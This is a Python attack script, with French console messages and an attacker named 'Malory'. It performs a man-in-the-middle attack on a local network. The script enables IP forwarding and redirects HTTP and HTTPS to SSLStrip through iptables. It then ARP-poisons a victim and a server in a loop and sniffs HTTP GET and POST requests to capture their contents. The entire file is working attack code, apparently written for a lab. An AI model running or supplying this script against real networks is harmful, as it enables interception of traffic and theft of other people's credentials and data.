from scapy.all import send, sniff, Raw
import os
import time

from scapy.layers.l2 import ARP

victim_ip = "192.168.89.137"
victim_mac = "AA:BB:CC:DD:EE:FF"
server_ip = "192.168.89.100"
server_mac = "FF:EE:DD:CC:BB:AA"
malory_ip = "192.168.89.166"
malory_mac = "11:22:33:44:55:66"

def enable_ip_forwarding():
    print("[Malory] Activation de l'IP forwarding...")
    if os.name == "posix":
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    elif os.name == "nt":
        os.system("netsh interface ipv4 set interface \"Wi-Fi\" forwarding=enabled")

def disable_ip_forwarding():
    print("[Malory] Désactivation de l'IP forwarding...")
    if os.name == "posix":
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    elif os.name == "nt":
        os.system("netsh interface ipv4 set interface \"Wi-Fi\" forwarding=disabled")

def arp_poison():
    print("[Malory] Lancement de l'ARP Poisoning...")
    try:
        while True:
            victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=server_ip)
            server_packet = ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=victim_ip)

            send(victim_packet, verbose=0)
            send(server_packet, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[Malory] ARP Poisoning arrêté.")

def intercept_http(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')
        if "POST" in payload or "GET" in payload:
            print(f"[Intercepté] Requête HTTP :\n{payload}\n")

def start_packet_sniffing():
    print("[Malory] Capture des paquets HTTP...")
    sniff(filter="tcp port 80", prn=intercept_http, store=0)

def setup_sslstrip():
    print("[Malory] Configuration de SSLStrip et des iptables...")
    if os.name == "posix":
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
        os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080")
        os.system("sslstrip -l 8080 &")
    elif os.name == "nt":
        print("[Erreur] SSLStrip et redirection ne sont pas pris en charge sous Windows.")

def reset_iptables():
    print("[Malory] Réinitialisation des iptables...")
    if os.name == "posix":
        os.system("iptables -t nat -F")

try:
    print("[Malory] Initialisation de l'attaque...")
    enable_ip_forwarding()
    setup_sslstrip()
    arp_poison()
    start_packet_sniffing()
except KeyboardInterrupt:
    print("[Malory] Nettoyage...")
    disable_ip_forwarding()
    reset_iptables()
